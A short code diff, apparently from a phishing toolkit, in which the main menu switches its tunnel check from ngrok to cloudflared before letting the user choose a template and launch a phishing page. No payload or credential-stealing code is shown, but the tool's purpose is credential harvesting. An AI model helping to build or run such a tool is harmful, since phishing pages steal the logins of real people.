@@ -57,7 +57,7 @@ def main():
         if choice == 1:
             utils.kill_port(80)
             banner.show_banner()
-            config_status.check_ngrok()
+            config_status.check_cloudflared()
             selected_template = utils.choose_template()
             if selected_template:
                 phishing.pish(selected_template)
